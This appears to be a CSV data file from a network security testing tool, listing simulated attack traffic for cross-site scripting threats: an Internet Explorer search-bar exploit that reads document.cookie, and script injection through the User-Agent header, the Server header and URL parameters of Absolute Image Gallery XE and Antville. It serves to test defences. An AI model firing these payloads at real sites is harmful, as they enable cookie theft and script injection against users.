XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
﻿InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerSearchXSS2.xml,Internet Explorer Search Bar Injection,This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server.,HTTP,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 19:08:31 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 18:51:13 GMT[[0D 0A ]]ETag: ""47e76-1d5-25076a40""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 469[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html><head></head>[[0A ]]<body><p><font size=""7"">WsOpenFileJPU-MyPage</font></p>[[0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0A ]]  at <a href=""http://umbrella.mx.tc/"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0A ]]<script>[[0A ]]VtUrl=""http://www.google.com/"";[[0A ]]window.open(VtUrl,""_search"");[[0A ]]alert(""wait for VtUrl in Ws"");[[0A ]]window.open(""file:javascript:alert('document.cookie = '+document.cookie)"",""_search"");[[0A ]]</script></body></html>"
﻿InternetExplorerSearchXSS2_IPv6.xml,Internet Explorer Search Bar Injection (IPv6 Version),This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server. (IPv6 Version),HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerSearchXSS2_IPv6.xml,Internet Explorer Search Bar Injection (IPv6 Version),This threat causes a XSS event to happen by loading a webpage in the search bar of Internet Explorer.  This allows a malicious web site to steal user sensitive data or cause command execution.  This threat is a client attack that comes from the virtual server. (IPv6 Version),HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 19:08:31 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 18:51:13 GMT[[0D 0A ]]ETag: ""47e76-1d5-25076a40""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 469[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html><head></head>[[0A ]]<body><p><font size=""7"">WsOpenFileJPU-MyPage</font></p>[[0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0A ]]  at <a href=""http://umbrella.mx.tc/"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0A ]]<script>[[0A ]]VtUrl=""http://www.google.com/"";[[0A ]]window.open(VtUrl,""_search"");[[0A ]]alert(""wait for VtUrl in Ws"");[[0A ]]window.open(""file:javascript:alert('document.cookie = '+document.cookie)"",""_search"");[[0A ]]</script></body></html>"
﻿InternetExplorerSearchXSS_IPv6.xml,Internet Explorer XSS Injection Through Searchbar (IPv6 Version),"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server. (IPv6 Version)",HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
InternetExplorerSearchXSS_IPv6.xml,Internet Explorer XSS Injection Through Searchbar (IPv6 Version),"This threat attempts to insert Javascript into the search bar, causing code to be executed with full rights of the user.  Can be used to steal user data or run arbitrary programs.  This threat is a client attack that comes from the virtual server. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.1 200 OK[[0D 0A ]]Date: Tue, 29 Mar 2005 18:51:35 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)[[0D 0A ]]Last-Modified: Tue, 29 Mar 2005 18:51:13 GMT[[0D 0A ]]ETag: ""47e76-1d5-25076a40""[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Length: 469[[0D 0A ]]Connection: close[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<html><head></head>[[0A ]]<body><p><font size=""7"">WsOpenFileJPU-MyPage</font></p>[[0A ]]<p><font size=""6""><font size=""2""><b><i>Created by <a href=""http://clik.to/liudieyu"">LiuDieYu</a> [[0A ]]  at <a href=""http://umbrella.mx.tc/"">UMBRELLA.MX.TC</a> </i></b></font></font></p>[[0A ]]<script>[[0A ]]VtUrl=""http://www.google.com/"";[[0A ]]window.open(VtUrl,""_search"");[[0A ]]alert(""wait for VtUrl in Ws"");[[0A ]]window.open(""file:javascript:alert('document.cookie = '+document.cookie)"",""_search"");[[0A ]]</script></body></html>"
﻿UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,"GET / HTTP/1.0[[0A ]]Referer: http://example.com[[0A ]]User-Agent: Special brand ""/><Script>alert(&quot;1mp3r3ctr0x3rs&quot;);</script>[[0A 0A 0A]]"
UserAgentXSS.xml,Generic User-Agent XSS Attempt,"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿UserAgentXSS_IPv6.xml,Generic User-Agent XSS Attempt (IPv6 Version),"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information. (IPv6 Version)",HTTP/IPv6,TCP,"GET / HTTP/1.0[[0A ]]Referer: http://example.com[[0A ]]User-Agent: Special brand ""/><Script>alert(&quot;1mp3r3ctr0x3rs&quot;);</script>[[0A 0A 0A]]"
UserAgentXSS_IPv6.xml,Generic User-Agent XSS Attempt (IPv6 Version),"This attack represents a cross-site scripting attack through the user-agent field of HTTP.  This field is used in logfile analysis and some server side scripting.  By injecting Javascript into this field, code can be executed through the webpage and be used to steal session and login information. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
XSS_Server_Injection.xml,XSS HTTP Server Header Reply,"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server.",HTTP,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Date: Wed, 20 Apr 2005 20:50:27 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)                   <script>alert('1mp3rfectp3wns');</script>[[0D 0A ]]Last-Modified: Wed, 20 Apr 2005 20:49:14 GMT[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<HTML><BODY><A href='http://google.com'>TEST</a></Body></html>[[0D 0A]]"
﻿XSS_Server_Injection_IPv6.xml,XSS HTTP Server Header Reply (IPv6 Version),"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server. (IPv6 Version)",HTTP/IPv6,TCP,GET / HTTP/1.0[[0D 0A 0D 0A]]
XSS_Server_Injection_IPv6.xml,XSS HTTP Server Header Reply (IPv6 Version),"This attack represents a malicious reply from a webserver, by inserting Javascript elements into the Server header of the HTTP reply.  This will make some web crawlers log Dynamic HTML into their HTML reports, which will then be executed with local privileges.  This threat typically would come from webservers listening on port 80.  This threat is a client attack that comes from the virtual server. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP/1.0 200 OK[[0D 0A ]]Date: Wed, 20 Apr 2005 20:50:27 GMT[[0D 0A ]]Server: Apache/2.0.40 (Red Hat Linux)                   <script>alert('1mp3rfectp3wns');</script>[[0D 0A ]]Last-Modified: Wed, 20 Apr 2005 20:49:14 GMT[[0D 0A ]]Accept-Ranges: bytes[[0D 0A ]]Content-Type: text/html; charset=ISO-8859-1[[0D 0A 0D 0A ]]<HTML><BODY><A href='http://google.com'>TEST</a></Body></html>[[0D 0A]]"
﻿absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,GET /gallery.asp?action=viewimage&categoryid=8&text=&imageid=43&box=&shownew='><script>('XSS')</script> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Msnbot/2.4[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
absolute_xss.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability,"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿absolute_xss_IPv6.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability (IPv6 Version),"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80 (IPv6 Version)",HTTP/IPv6,TCP,GET /gallery.asp?action=viewimage&categoryid=8&text=&imageid=43&box=&shownew='><script>('XSS')</script> HTTP/1.0[[0D 0A ]]Host: www.example.com[[0D 0A ]]User-Agent: Msnbot/2.4[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]
absolute_xss_IPv6.xml,Absolute Image Gallery XE Multiple Cross-Site Scripting Vulnerability (IPv6 Version),"This threat sends a crafted url to take advantage of a flaw in Absolute Image Gallery XE which does not properly
sanitize user-supplied which allows malicious users to execute code on the affected site.
Absolute Image Gallery XE is a web application the typically listens on port 80 (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿antvilleXSS.xml,Antville URL XSS injection,"This threat sends a crafted HTTP Request with with a modified URL string containing Javascript pop-up, the script is inserted into the page with no checking.  Antiville is a web application that typically listens on port 80.",HTTP,TCP,GET /project/about/%3Cscript%3Ealert('XSS');%3C/script%3E HTTP/1.0[[0D 0A 0D 0A]]
